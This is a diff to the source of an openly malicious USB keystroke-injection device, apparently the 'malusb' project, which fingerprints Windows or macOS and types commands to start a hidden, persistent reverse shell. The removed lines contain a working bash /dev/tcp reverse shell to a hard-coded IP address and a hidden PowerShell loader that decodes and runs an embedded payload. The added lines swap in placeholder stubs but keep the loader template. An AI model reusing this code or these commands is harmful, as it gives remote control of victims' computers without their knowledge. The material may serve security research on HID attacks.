@@ -1,10 +1,11 @@
 /*
  * Malicious HID USB payload
- * 
+ * https://github.com/LightWind/malusb
+ *
  * Malicious chimera HID payload that create a background reverse shell to the server of your choice
- * Works both on Windows and OSX
- * 
- * @see: https://www.elie.net/malusb
+ * Works both on Windows and OSX. See the README to know how to configure it.
+ *
+ * @see: https://www.elie.net/malusb for more information on HID spoofing devices.
  * @authors Elie Bursztein (contact@elie.net),  Jean Michel Picod (jmichel.p@gmail.com)
  * @licence: GPL v3
  */
@@ -12,21 +13,12 @@
 #include <stdio.h>
 
 /////////////////////////////////////////////////
-/// Reverse shell payloads 
+/// Reverse shell payloads
 /////////////////////////////////////////////////
 
-/*
-#define MSF_IP "104.197.171.58"
-#define MSF_PORT "443"
-#define OSX_PAYLOAD "echo C&C: %s/%s" // first %s is IP, second %s is PORT
-//#define OSX_PAYLOAD "(nohup bash -c \"while true;do bash -i >& /dev/tcp/%s/%s 0>&1 2>&1; sleep 1;done\" 1>/dev/null &)"
-#define PAYLOAD_OSX_SIZE 2048 // buffer size once the payload is instaniated. 
-char payload_osx [PAYLOAD_OSX_SIZE];
-*/
-
-const char* OSX_PAYLOAD = "(nohup bash -c \"while true;do bash -i >& /dev/tcp/104.197.171.58/443 0>&1 2>&1; sleep 1;done\" 1>/dev/null &)";
-
-const char* WIN_PAYLOAD  = "powershell -exec bypass -nop -W hidden -noninteractive -Command \"& {$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sICKvRelcAA3Bvd2Vyc2hlbGwudHh0AI1S72vbMBD9Ptj/cBhtyCQWdpbSLeCyzktHoEvDHOiHEIgj32IvshQkOT9o979XShMYDEL1SXd69+7dPU204mgMPL1/RxpVtgJN+pWGLuLpGHfRw/IPcgv5wVhs2BgtyxVfozVsmk0yUaO0NEjiPku+XLPkOmFXn4Nuv//JM5iUcPYDbW41Fo0nnS0PFmfzOVmmMWO92J3nD0/xXwcuUzqzuLcMJVdlLVfzweA2z0aj0FN8c3WGBo+1LNXOwETtUOcVCgG6ldKhoTDQGtQQdAjK7cDfZdFgJwAlz0mumk1rzw8LmanNQderygLNQujFyRX8rLlWRv22kCm9UbqwtZIMbn0njzSg0VFvsWQLuZDBcU72qGuLlJTduEtKdo9yZavwrUNNcqePuji6V/zYL2STwlad4OYy/a6qBVJK6tRhfmFRUrL0kOUZEkIkEWIH9fYO/zU0mh42OHZ7OFs79TKP2oYnra7ke0qGJwdd4kRfe1HrlI7kVq0xGu43biXGyYYoU01TyBJICb2bjwk8w0Nro9dqXyVSsu5cGhgCh9qnlKDWSs/i+X8UxwfGBRaanihFh+zfuGwiLhtm2J1oTeWZ/afkLBPK4Cl8AWMRgWksAwAA'));$t=(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();IEX $t }\";exit";
+/* Those payloads stub need to be replaced with actual payloads to work */
+const char* OSX_PAYLOAD = "OSX_PAYLOAD_STR";
+const char* WIN_PAYLOAD  = "powershell -exec bypass -nop -W hidden -noninteractive -Command \"& {$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('WIN_PAYLOAD_STR'));$t=(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();IEX $t }\";exit";
 
 /////////////////////////////////////////////////
 /// Internal constants
@@ -90,7 +82,7 @@ void toggle_lock(void) {
 void reset_lock(void) {
   if (is_locked()) {
     toggle_lock();
-  } 
+  }
 }
 
 /////////////////////////////////////////////////
@@ -112,14 +104,14 @@ boolean is_osx() {
   //Toggle
   set_key(1, sk);
   type_keys();
-  
+
   // Get status
   status2 = ((keyboard_leds & sk) == sk) ? 1 : 0;
   clear_keys();
   is_done();
-  
+
   if (status1 == status2) {
-    return true; 
+    return true;
   } else {
     return false;
   }
@@ -131,7 +123,7 @@ void set_modifier(unsigned short m) {
 }
 
 /*!
- * Set keyboard key values 
+ * Set keyboard key values
  * @param position: the position of the key in [1, 6]
  * @param value: the key value
  */
@@ -161,9 +153,9 @@ void set_key(unsigned short position, unsigned short value) {
   }
 }
 
-/*! 
+/*!
  * Type the given key combination
- * type/write the keys, clear and wait to be succesful 
+ * type/write the keys, clear and wait to be succesful
  * @return if the command succeeded or not
  */
 void type_keys(void) {
@@ -172,12 +164,12 @@ void type_keys(void) {
   delay(DELAY);
 }
 
-/*! 
+/*!
  * Type a command line including "ENTER"
- * type/write the keys, clear and wait to be succesful 
+ * type/write the keys, clear and wait to be succesful
  * @return if the command succeeded or not
  */
-void type_command(const char* cmd) {  
+void type_command(const char* cmd) {
   Keyboard.print(cmd);
   Keyboard.send_now();
   delay(DELAY);
@@ -190,15 +182,15 @@ void type_command(const char* cmd) {
 
 
 /*!
- * clear keyboard 
+ * clear keyboard
  * return true if sucessful
  */
 void clear_keys (void){
-  
+
   // reset all keys
   for (int i = 1; i < 7; i++)
     set_key(i, 0);
-  
+
   // reset modifier
   set_modifier(0);
   Keyboard.send_now();
@@ -207,14 +199,14 @@ void clear_keys (void){
 
 /*!
  * Wait until the drivers are load and the teensy active.
- * 
- * The idea behind this is to try to get the onboard light to blink 
+ *
+ * The idea behind this is to try to get the onboard light to blink
  * and then try to lock our lock key. If both succeed then we are ready
- * 
- * @note: Idea from Offsec Peensy code 
+ *
+ * @note: Idea from Offsec Peensy code
  */
 void wait_for_drivers(void) {
-    //until we are ready 
+    //until we are ready
     for(int i = 0; i < LOCK_ATTEMPTS && (!is_locked()); i++) {
         digitalWrite(LED_PIN, HIGH);
         digitalWrite(LED_PIN, LOW);
@@ -226,14 +218,14 @@ void wait_for_drivers(void) {
     if (!is_locked()) {
       osx_close_windows();
     }
-      
+
     //reseting lock
     reset_lock();
     delay(100);
 }
 
 
-/*! 
+/*!
  * Check if a commad is sucessful by testing the lock key
  */
 void is_done (void) {
@@ -298,7 +290,7 @@ void osx_hide_windows(void) {
 void osx_exec_payload(void) {
   //hide all the window
   osx_hide_windows();
-  
+
   //spotlight
   osx_open_spotlight();
 
@@ -307,9 +299,9 @@ void osx_exec_payload(void) {
 
   //payload
   type_command(OSX_PAYLOAD);
-  
+
   //cleanup
-  osx_close_windows(); 
+  osx_close_windows();
 }
 
 /////////////////////////////////////////////////
@@ -318,14 +310,14 @@ void osx_exec_payload(void) {
 
 /*
  * Fingerprinting technique using powershell
- * @credit NFCpowershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('{SCROLLLOCK}')"
- * 
+ * @credit NFC
+ *
  */
 bool fingerprint_windows(void) {
   int status1 = 0; //LED status before toggle
   int status2 = 0; //LED status after toggle
   unsigned short sk  = SCROLLLOCK;
-  
+
   // Get status
   status1 = ((keyboard_leds & sk) == sk) ? 1 : 0;
   delay(DELAY);
@@ -335,13 +327,13 @@ bool fingerprint_windows(void) {
   win_open_execute();
   type_command("powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys('{SCROLLLOCK}')\"");
   delay(DELAY);
-  
+
   // Get status
   status2 = ((keyboard_leds & sk) == sk) ? 1 : 0;
   is_done();
-  
+
   if (status1 != status2) {
-    return true; 
+    return true;
   } else {
     return false;
   }
@@ -358,8 +350,8 @@ void win_open_execute(void) {
 void win_payload(void) {
   // exex prompt
   win_open_execute();
-    
-  //cmd 
+
+  //cmd
   type_command("cmd");
 
   //run payload
